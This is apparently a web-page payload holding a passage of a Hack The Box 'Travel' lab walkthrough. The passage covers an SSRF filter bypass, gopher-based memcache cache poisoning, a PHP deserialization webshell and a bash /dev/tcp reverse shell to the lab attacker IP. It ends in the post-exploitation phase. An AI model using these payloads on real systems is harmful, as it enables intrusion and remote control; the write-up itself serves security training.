@@ -1,0 +1,680 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+f:I[6025,[],"OutletBoundary"]
+10:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-travel-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Travel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Travel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T10:54:17.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[19," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-travel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Travel machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Travel machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/travel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3aee13cd377cbe7fe3c4c69c628157d7840f7800/HTB-Travel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 3aee13cd377c",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Travel"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/travel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Travel machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"11 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+d:T9b8d,
+<p><strong>Machine:</strong> Travel<br /><strong>OS:</strong> Linux (Ubuntu 20.04)<br /><strong>Difficulty:</strong> Hard<br /><strong>IP:</strong> <code>10.129.2.151</code><br /><strong>Attacker:</strong> <code>10.10.14.6</code>  </p>
+<hr />
+<h2 id="introduction-the-big-picture">Introduction: The Big Picture</h2>
+<p>Before we touch a single command, let's understand what we're looking at. When you approach any machine, your job as a penetration tester is to build a <strong>mental map</strong> of the target. You're asking:</p>
+<ul>
+<li>What services are exposed?</li>
+<li>What does normal traffic look like?</li>
+<li>Where might developers have left behind artifacts?</li>
+<li>What trust relationships exist between components?</li>
+</ul>
+<p>Travel is a beautifully constructed machine because it teaches a <strong>chain of vulnerabilities</strong>. No single bug gives you root. Instead, you must connect several weaknesses:</p>
+<ol>
+<li><strong>Information Disclosure</strong> → Exposed <code>.git</code> directory leaks source code</li>
+<li><strong>SSRF (Server-Side Request Forgery)</strong> → The RSS feed fetcher can talk to internal services</li>
+<li><strong>Cache Poisoning</strong> → We can write arbitrary data into memcache</li>
+<li><strong>PHP Deserialization</strong> → The cache stores serialized PHP objects that execute code when read</li>
+<li><strong>Credential Recovery</strong> → A forgotten database backup contains a crackable hash</li>
+<li><strong>LDAP Injection/Modification</strong> → SSH is configured to pull users and keys from LDAP, allowing us to manufacture a root path</li>
+</ol>
+<p>This walkthrough will explain <strong>every single command</strong>, <strong>every file</strong>, and <strong>every thought process</strong> in extreme detail.</p>
+<hr />
+<h2 id="phase-1-external-reconnaissance-mapping-the-attack-surface">Phase 1: External Reconnaissance — Mapping the Attack Surface</h2>
+<h3 id="1-1-why-reconnaissance-comes-first">1.1 Why Reconnaissance Comes First</h3>
+<p>You cannot attack what you do not understand. Reconnaissance is about <strong>reducing uncertainty</strong>. We need to know:</p>
+<ul>
+<li>Which ports are open?</li>
+<li>What software versions are running?</li>
+<li>Are there hidden services or virtual hosts?</li>
+</ul>
+<p>Hackers don't guess. They enumerate systematically.</p>
+<h3 id="1-2-port-scanning-with-nmap">1.2 Port Scanning with Nmap</h3>
+<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.2.151
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ul>
+<li><code>-p-</code> scans <strong>all 65,535 TCP ports</strong>. We don't assume only common ports matter. Developers often put services on high ports thinking they're hidden ("security through obscurity").</li>
+<li><code>--min-rate 10000</code> sends packets fast so the scan completes quickly.</li>
+</ul>
+<p><strong>Why this mindset matters:</strong>
+Many beginners only scan the top 1000 ports. On a real engagement, that's how you miss management interfaces, backup services, or Docker APIs sitting on port 2375 or 8080.</p>
+<p><strong>Results:</strong></p>
+<pre><code>PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</code></pre>
+<p>Only three ports. SSH is rarely the initial entry point on modern boxes (it requires credentials or key-based auth), so we focus on <strong>HTTP and HTTPS</strong>.</p>
+<h3 id="1-3-service-version-detection">1.3 Service Version Detection</h3>
+<pre><code class="language-bash" data-language="bash">nmap -p 22,80,443 -sV -sC 10.129.2.151
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ul>
+<li><code>-sV</code> probes services to determine version numbers (e.g., nginx 1.17.6, OpenSSH 8.2p1)</li>
+<li><code>-sC</code> runs default NSE (Nmap Scripting Engine) scripts</li>
+</ul>
+<p><strong>The Hacker Mindset:</strong>
+Version numbers are gold. If we see nginx 1.17.6, we can search for known CVEs. If we see WordPress 5.4, we can check for plugin vulnerabilities. Even if there's no public exploit, knowing the stack tells us what attack paths are plausible.</p>
+<p><strong>Critical Discovery — SSL Certificate SANs:</strong></p>
+<pre><code>ssl-cert: Subject: commonName=www.travel.htb
+Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+</code></pre>
+<h3 id="1-4-virtual-hosts-the-hidden-websites">1.4 Virtual Hosts: The Hidden Websites</h3>
+<p><strong>What is a virtual host?</strong>
+Web servers like nginx and Apache can host <strong>multiple websites on the same IP address</strong> by looking at the <code>Host</code> header in HTTP requests. The certificate just told us there are <strong>three different websites</strong> on this one IP.</p>
+<p><strong>Why this matters:</strong>
+The main site (<code>www.travel.htb</code>) might be a polished production site with heavy security. But <code>blog-dev.travel.htb</code> sounds like a <strong>development environment</strong> — and dev environments are often less secure, contain debugging features, or leak source code.</p>
+<p><strong>Adding hosts to /etc/hosts:</strong></p>
+<pre><code class="language-bash" data-language="bash">echo "10.129.2.151    travel.htb www.travel.htb blog.travel.htb blog-dev.travel.htb" | sudo tee -a /etc/hosts
+</code></pre>
+<p><strong>Why <code>/etc/hosts</code>?</strong>
+Your computer needs to resolve hostnames to IPs. Since this is a lab environment without public DNS, we manually map them. Without this, <code>curl http://blog.travel.htb</code> wouldn't know where to go.</p>
+<h3 id="1-5-enumerating-each-virtual-host">1.5 Enumerating Each Virtual Host</h3>
+<h4 id="www-travel-htb"><a href="http://www.travel.htb" target="_blank" rel="nofollow noopener noreferrer">www.travel.htb</a></h4>
+<p>A static "coming soon" travel site. Non-functional links. We note it but move on.</p>
+<h4 id="blog-travel-htb">blog.travel.htb</h4>
+<p>A <strong>WordPress 5.4</strong> blog. WordPress means:</p>
+<ul>
+<li>A database (usually MySQL/MariaDB)</li>
+<li>Themes and plugins (common attack surface)</li>
+<li>User accounts</li>
+<li>An admin panel at <code>/wp-admin/</code></li>
+</ul>
+<p>We note the mention of an "Awesome RSS" feature and a TODO comment about copying from <code>-dev</code> to <code>-prod</code>.</p>
+<h4 id="blog-dev-travel-htb">blog-dev.travel.htb</h4>
+<p><strong>HTTP 403 Forbidden.</strong> </p>
+<p><strong>The Hacker Mindset:</strong> A 403 is <strong>NOT a dead end</strong>. It means "you can't list the directory," not "there's nothing here." Many attackers give up at 403. The good ones dig deeper.</p>
+<hr />
+<h2 id="phase-2-finding-the-entry-point-the-exposed-git-repository">Phase 2: Finding the Entry Point — The Exposed Git Repository</h2>
+<h3 id="2-1-why-we-directory-scan">2.1 Why We Directory-Scan</h3>
+<p>Even if a site returns 403 on the root, there might be <strong>specific files or directories</strong> accessible. Common ones:</p>
+<ul>
+<li><code>/.git/</code> — Git version control metadata</li>
+<li><code>/backup/</code>, <code>/old/</code>, <code>/test/</code> — Forgotten copies</li>
+<li><code>/.env</code>, <code>/config.php</code> — Configuration leaks</li>
+<li><code>/robots.txt</code> — Tells us what the site owner is hiding</li>
+</ul>
+<h3 id="2-2-finding-git-with-gobuster">2.2 Finding .git with Gobuster</h3>
+<pre><code class="language-bash" data-language="bash">gobuster dir -u http://blog-dev.travel.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+</code></pre>
+<p><strong>Discovery:</strong> <code>/.git/HEAD</code> returns HTTP 200.</p>
+<p><strong>What is <code>.git/HEAD</code>?</strong>
+Git stores repository metadata in a <code>.git</code> folder. <code>HEAD</code> is a small text file that points to the current branch (e.g., <code>ref: refs/heads/master</code>). If you can read this file, the <strong>entire <code>.git</code> directory might be downloadable</strong>.</p>
+<p><strong>Why developers expose .git:</strong>
+They deploy by running <code>git clone</code> or copying files but forget to remove <code>.git</code>. They might think <code>.htaccess</code> protects it, but misconfigurations happen constantly. This is one of the most common and critical vulnerabilities in web applications.</p>
+<h3 id="2-3-dumping-the-git-repository">2.3 Dumping the Git Repository</h3>
+<p>We use <code>git-dumper</code>, a tool specifically designed to reconstruct a Git repository from an exposed <code>.git</code> folder:</p>
+<pre><code class="language-bash" data-language="bash">git clone https://github.com/arthaud/git-dumper.git
+pip3 install PySocks dulwich
+python3 git-dumper/git_dumper.py http://blog-dev.travel.htb/ gitsource
+</code></pre>
+<p><strong>How git-dumper works:</strong>
+It walks the Git object database (<code>.git/objects/</code>), downloads all commits, trees, and blobs, then reconstructs the file system. Git is a <strong>content-addressable filesystem</strong> — every file version is stored as a hash. If we have all the hashes, we have all the history.</p>
+<h3 id="2-4-restoring-deleted-files">2.4 Restoring Deleted Files</h3>
+<pre><code class="language-bash" data-language="bash">cd gitsource
+git checkout -- .
+</code></pre>
+<p><strong>Why this step?</strong>
+The repository might have files that were committed but later deleted from the working tree. <code>git checkout -- .</code> restores all tracked files to their committed state. This is how we recover source code that isn't currently deployed.</p>
+<p><strong>Files recovered:</strong></p>
+<ul>
+<li><code>README.md</code></li>
+<li><code>rss_template.php</code></li>
+<li><code>template.php</code></li>
+</ul>
+<hr />
+<h2 id="phase-3-source-code-analysis-understanding-the-application">Phase 3: Source Code Analysis — Understanding the Application</h2>
+<h3 id="3-1-readme-md-the-developer-s-notes">3.1 README.md — The Developer's Notes</h3>
+<pre><code class="language-markdown" data-language="markdown"># Rss Template Extension
+Allows rss-feeds to be shown on a custom wordpress page.
+
+## Setup
+* copy rss_template.php &amp; template.php to `wp-content/themes/twentytwenty`
+* create logs directory in `wp-content/themes/twentytwenty`
+
+## Changelog
+- temporarily disabled cache compression
+- added additional security checks
+- added caching
+- added rss template
+
+## ToDo
+- finish logging implementation
+</code></pre>
+<p><strong>Key Intelligence:</strong></p>
+<ol>
+<li>These files belong to a WordPress theme (<code>twentytwenty</code>)</li>
+<li>There's a <code>logs</code> directory we might be able to write to</li>
+<li>Caching was added (where? how?)</li>
+<li><strong>Logging is unfinished</strong> — this often means half-implemented features with security holes</li>
+</ol>
+<h3 id="3-2-rss-template-php-the-rss-feed-parser">3.2 rss_template.php — The RSS Feed Parser</h3>
+<p>This file creates the <code>/awesome-rss/</code> page on the blog. Let's break it down:</p>
+<pre><code class="language-php" data-language="php">function get_feed($url){
+    require_once ABSPATH . '/wp-includes/class-simplepie.php';
+    $simplepie = new SimplePie();
+    $simplepie-&gt;set_cache_location('memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_');
+    $simplepie-&gt;set_feed_url($url);
+    $simplepie-&gt;init();
+    ...
+}
+</code></pre>
+<p><strong>What's happening:</strong></p>
+<ul>
+<li>It uses <strong>SimplePie</strong>, a popular PHP RSS parser</li>
+<li>It caches feed data in <strong>memcache</strong> on <code>127.0.0.1:11211</code></li>
+<li>Cache expires after <strong>60 seconds</strong></li>
+<li>Cache keys are prefixed with <strong><code>xct_</code></strong></li>
+</ul>
+<p><strong>The URL Logic:</strong></p>
+<pre><code class="language-php" data-language="php">$url = $_SERVER['QUERY_STRING'];
+if(strpos($url, "custom_feed_url") !== false){
+    $tmp = (explode("=", $url));
+    $url = end($tmp);
+} else {
+    $url = "http://www.travel.htb/newsfeed/customfeed.xml";
+}
+</code></pre>
+<p><strong>Why this is dangerous:</strong>
+If the query string contains <code>custom_feed_url</code>, it splits by <code>=</code> and takes the <strong>last part</strong> as the URL. This means:</p>
+<pre><code>?custom_feed_url&amp;url=http://attacker.com/feed
+</code></pre>
+<p>The <code>$url</code> becomes <code>http://attacker.com/feed</code>.</p>
+<p><strong>The <code>debug</code> parameter:</strong></p>
+<pre><code class="language-php" data-language="php">&lt;!--
+DEBUG
+&lt;?php
+if (isset($_GET['debug'])){
+  include('debug.php');
+}
+?&gt;
+--&gt;
+</code></pre>
+<p>When <code>?debug</code> is passed, it includes <code>debug.php</code>, which shows cached memcache data. This is our <strong>reconnaissance tool</strong> for the attack.</p>
+<h3 id="3-3-template-php-the-security-layer">3.3 template.php — The "Security" Layer</h3>
+<p>This file has two critical parts:</p>
+<h4 id="part-a-safe-the-input-filter">Part A: <code>safe()</code> — The Input Filter</h4>
+<pre><code class="language-php" data-language="php">function safe($url)
+{
+    $tmpUrl = urldecode($url);
+    if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
+    {       
+        die("&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;");
+    }
+    if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
+    {       
+        die("&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;");
+    }
+    $tmp = parse_url($url, PHP_URL_HOST);
+    if($tmp == "localhost" or $tmp == "127.0.0.1")
+    {       
+        die("&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;");      
+    }
+    return $url;
+}
+</code></pre>
+<p><strong>What the developer was trying to do:</strong></p>
+<ul>
+<li>Block <code>file://</code> and <code>@</code> to prevent Local File Inclusion (LFI)</li>
+<li>Block <code>-o</code> and <code>-F</code> to prevent curl command injection</li>
+<li>Block <code>localhost</code> and <code>127.0.0.1</code> to prevent SSRF to internal services</li>
+</ul>
+<p><strong>Why it fails (The Hacker Mindset):</strong>
+Input validation is hard. The developer used a <strong>blocklist</strong> ("deny these specific things") instead of an <strong>allowlist</strong> ("only allow these specific things"). Blocklists are inherently incomplete.</p>
+<p><strong>The Bypass:</strong>
+<code>parse_url()</code> parses the hostname. If we use <code>2130706433</code> (the decimal representation of <code>127.0.0.1</code>), <code>parse_url()</code> returns the string <code>"2130706433"</code>, which doesn't equal <code>"127.0.0.1"</code> or <code>"localhost"</code>. However, when curl resolves it, it converts the decimal IP back to <code>127.0.0.1</code>.</p>
+<p>Other bypasses that work similarly:</p>
+<ul>
+<li><code>0x7f000001</code> (hexadecimal)</li>
+<li><code>0177.0.0.1</code> (octal)</li>
+<li><code>127.1</code> (short form)</li>
+</ul>
+<p>This is a fundamental lesson: <strong>Never trust user input.</strong> And never assume a simple string check is sufficient for security.</p>
+<h4 id="part-b-url-get-contents-the-command-execution">Part B: <code>url_get_contents()</code> — The Command Execution</h4>
+<pre><code class="language-php" data-language="php">function url_get_contents ($url) {
+    $url = safe($url);
+    $url = escapeshellarg($url);
+    $pl = "curl ".$url;
+    $output = shell_exec($pl);
+    return $output;
+}
+</code></pre>
+<p><strong>What's happening:</strong></p>
+<ol>
+<li>The URL goes through <code>safe()</code></li>
+<li><code>escapeshellarg()</code> wraps it in single quotes</li>
+<li>It's passed to <code>shell_exec()</code> as part of a curl command</li>
+</ol>
+<p><strong>Why <code>escapeshellarg</code> doesn't save us:</strong>
+<code>escapeshellarg</code> prevents command injection (you can't do <code>; rm -rf /</code>), but it <strong>doesn't prevent SSRF</strong>. The URL is still passed to curl, and curl supports many protocols besides HTTP: <code>ftp://</code>, <code>dict://</code>, <code>gopher://</code>, <code>file://</code> (if not blocked), etc.</p>
+<h4 id="part-c-templatehelper-the-deserialization-gadget">Part C: <code>TemplateHelper</code> — The Deserialization Gadget</h4>
+<pre><code class="language-php" data-language="php">class TemplateHelper
+{
+    private $file;
+    private $data;
+
+    public function __construct(string $file, string $data)
+    {
+        $this-&gt;init($file, $data);
+    }
+
+    public function __wakeup()
+    {
+        $this-&gt;init($this-&gt;file, $this-&gt;data);
+    }
+
+    private function init(string $file, string $data)
+    {           
+        $this-&gt;file = $file;
+        $this-&gt;data = $data;
+        file_put_contents(__DIR__.'/logs/'.$this-&gt;file, $this-&gt;data);
+    }
+}
+</code></pre>
+<p><strong>What is this class?</strong>
+It's an <strong>unfinished logging implementation</strong>. The TODO in README.md said "finish logging implementation via TemplateHelper."</p>
+<p><strong>The critical method: <code>__wakeup()</code></strong>
+In PHP, <code>__wakeup()</code> is a <strong>magic method</strong> that runs automatically when an object is <strong>deserialized</strong> (converted from a string back to an object). </p>
+<p><strong>The Attack Idea:</strong>
+If we can make the server deserialize a <code>TemplateHelper</code> object where:</p>
+<ul>
+<li><code>$file</code> = <code>shell.php</code></li>
+<li><code>$data</code> = <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></li>
+</ul>
+<p>Then <code>__wakeup()</code> will call <code>init()</code>, which will write our webshell to:</p>
+<pre><code>__DIR__.'/logs/'.$this-&gt;file
+</code></pre>
+<p>Since <code>template.php</code> is in <code>wp-content/themes/twentytwenty/</code>, the shell goes to:</p>
+<pre><code>/wp-content/themes/twentytwenty/logs/shell.php
+</code></pre>
+<hr />
+<h2 id="phase-4-exploiting-the-vulnerability-chain">Phase 4: Exploiting the Vulnerability Chain</h2>
+<h3 id="4-1-the-attack-chain-overview">4.1 The Attack Chain Overview</h3>
+<p>Our path to code execution requires connecting multiple dots:</p>
+<ol>
+<li><strong>SSRF</strong>: Use <code>custom_feed_url</code> to make the server talk to internal memcache</li>
+<li><strong>Protocol Smuggling</strong>: Use <code>gopher://</code> to send raw memcache commands</li>
+<li><strong>Cache Poisoning</strong>: Overwrite a legitimate cache key with our serialized payload</li>
+<li><strong>Deserialization Trigger</strong>: Visit the RSS page to read the cache, triggering <code>__wakeup()</code></li>
+<li><strong>Webshell</strong>: The deserialized object writes <code>shell.php</code></li>
+<li><strong>RCE</strong>: Visit the webshell with commands</li>
+</ol>
+<h3 id="4-2-why-gopher-and-not-http">4.2 Why Gopher and Not HTTP?</h3>
+<p>If we tried to use <code>http://127.0.0.1:11211/</code>, curl would send:</p>
+<pre><code>GET / HTTP/1.1
+Host: 127.0.0.1:11211
+User-Agent: curl/7.68.0
+Accept: */*
+</code></pre>
+<p>Memcache expects <strong>raw text commands</strong>, not HTTP headers. The headers would confuse memcache and break the connection.</p>
+<p><strong>Gopher</strong> is an old protocol that sends <strong>only the payload</strong> after the path, with no headers. Perfect for talking to non-HTTP services.</p>
+<h3 id="4-3-understanding-memcache-key-generation">4.3 Understanding Memcache Key Generation</h3>
+<p>Before we can poison the cache, we need to know <strong>the exact key name</strong>. SimplePie generates it dynamically.</p>
+<p><strong>Step 1: The feed URL is hashed</strong></p>
+<pre><code class="language-php" data-language="php">$cache_name_function = 'md5';
+$filename = md5($url);
+</code></pre>
+<p>For the default feed:</p>
+<pre><code class="language-bash" data-language="bash">echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum
+# [redacted retired-lab hash or flag]
+</code></pre>
+<p><strong>Step 2: Append the type</strong>
+The cache type for feed data is <code>spc</code>:</p>
+<pre><code class="language-bash" data-language="bash">echo -n '[redacted retired-lab hash or flag]:spc' | md5sum
+# [redacted retired-lab hash or flag]
+</code></pre>
+<p><strong>Step 3: Add the prefix</strong>
+From <code>rss_template.php</code>: <code>prefix=xct_</code></p>
+<p><strong>Final key:</strong> <code>xct_[redacted retired-lab hash or flag]</code></p>
+<p><strong>Why we use the default feed key:</strong>
+We could host our own feed and calculate a new key, but using the default key is faster. The only risk is that someone else might overwrite it, but on a private instance, that's not an issue.</p>
+<h3 id="4-4-crafting-the-serialized-payload">4.4 Crafting the Serialized Payload</h3>
+<p>We create a local PHP script to generate the exact serialized string:</p>
+<pre><code class="language-php" data-language="php">&lt;?php
+class TemplateHelper {
+    public $file;
+    public $data;
+    public function __construct() {
+        $this-&gt;file = 'shell.php';
+        $this-&gt;data = '&lt;?php system($_REQUEST["cmd"]); ?&gt;';
+    }
+}
+$obj = new TemplateHelper();
+echo serialize($obj);
+?&gt;
+</code></pre>
+<p><strong>Why <code>public</code> instead of <code>private</code>?</strong>
+In the original source, <code>$file</code> and <code>$data</code> are <code>private</code>. However, PHP's serialization format for private properties includes null bytes and class names, making manual crafting error-prone. Using <code>public</code> in our payload works because PHP's deserialization engine <strong>matches properties by name</strong>, and the <code>__wakeup()</code> method reinitializes them through <code>init()</code>.</p>
+<p><strong>Output:</strong></p>
+<pre><code>O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"&lt;?php system($_REQUEST["cmd"]); ?&gt;";}
+</code></pre>
+<p><strong>Length: 106 bytes.</strong> This is important for the memcache <code>SET</code> command.</p>
+<h3 id="4-5-the-memcache-set-command">4.5 The Memcache SET Command</h3>
+<p>Memcache protocol for storing data:</p>
+<pre><code>set &lt;key&gt; &lt;flags&gt; &lt;exptime&gt; &lt;bytes&gt;\r\n
+&lt;value&gt;\r\n
+</code></pre>
+<p>For our attack:</p>
+<pre><code>set xct_[redacted retired-lab hash or flag] 4 0 106\r\n
+O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"&lt;?php system($_REQUEST["cmd"]); ?&gt;";}\r\n
+</code></pre>
+<ul>
+<li><code>4</code> = flags (arbitrary, mimics what SimplePie uses)</li>
+<li><code>0</code> = expiry (never expire, or 0 = immediate, but memcache still stores it)</li>
+<li><code>106</code> = exact byte length of the payload</li>
+</ul>
+<h3 id="4-6-the-gopher-url">4.6 The Gopher URL</h3>
+<p>We URL-encode the memcache command for Gopher:</p>
+<pre><code>gopher://2130706433:11211/_%0d%0aset%20xct_[redacted retired-lab hash or flag]%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+</code></pre>
+<p><strong>Breaking it down:</strong></p>
+<ul>
+<li><code>gopher://</code> = protocol</li>
+<li><code>2130706433</code> = decimal IP for 127.0.0.1 (bypasses safe())</li>
+<li><code>:11211</code> = memcache port</li>
+<li><code>/_</code> = Gopher path separator + payload start</li>
+<li><code>%0d%0a</code> = CRLF (line endings memcache expects)</li>
+<li><code>%20</code> = spaces</li>
+<li><code>%22</code>, <code>%3B</code>, <code>%7B</code>, <code>%7D</code>, <code>%28</code>, <code>%29</code>, <code>%5B</code>, <code>%5D</code> = URL-encoded special characters</li>
+</ul>
+<h3 id="4-7-executing-the-attack">4.7 Executing the Attack</h3>
+<p><strong>Step 1: Poison the cache</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=gopher://2130706433:11211/_%0d%0aset%20xct_[redacted retired-lab hash or flag]%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a"
+</code></pre>
+<p><strong>Step 2: Verify poisoning</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/?debug" | grep TemplateHelper
+</code></pre>
+<p>If you see the serialized object in the debug output, the cache now contains our payload.</p>
+<p><strong>Step 3: Trigger deserialization</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/" &gt; /dev/null
+</code></pre>
+<p>When SimplePie initializes, it reads from memcache, calls <code>unserialize()</code> on our payload, which triggers <code>__wakeup()</code>, which writes <code>shell.php</code>.</p>
+<p><strong>Step 4: Confirm RCE</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=id"
+</code></pre>
+<p><strong>Expected:</strong> <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
+<h3 id="4-8-upgrading-to-a-reverse-shell">4.8 Upgrading to a Reverse Shell</h3>
+<p>A webshell is fine, but an interactive shell is better. We use bash's built-in TCP redirection:</p>
+<pre><code class="language-bash" data-language="bash"># On Kali (listener)
+nc -lvnp 4444
+
+# Trigger reverse shell via webshell
+curl -G "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php" \
+  --data-urlencode "cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'"
+</code></pre>
+<p><strong>Why this works:</strong>
+Bash can open TCP connections using <code>/dev/tcp/host/port</code> pseudo-devices. We redirect stdin (0), stdout (1), and stderr (2) to that TCP socket, giving the attacker a fully interactive shell.</p>
+<p><strong>Stabilizing the shell (optional but recommended):</strong></p>
+<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Press Ctrl+Z to background
+# On Kali:
+stty raw -echo; fg
+# Press Enter twice
+export TERM=xterm
+</code></pre>
+<hr />
+<h2 id="phase-5-post-exploitation-escaping-the-container">Phase 5: Post-Exploitation — Escaping the Container</h2>
+<h3 id="5-1-discovering-we-re-in-a-container">5.1 Discovering We're in a Container</h3>
+<pre><code class="language-bash" data-language="bash">www-data@blog:/$ ls -la /.dockerenv
+-rwxr-xr-x 1 root root 0 Apr 23 18:44 .dockerenv
+www-data@blog:/$ hostname
+blog
+www-data@blog:/$ ip addr
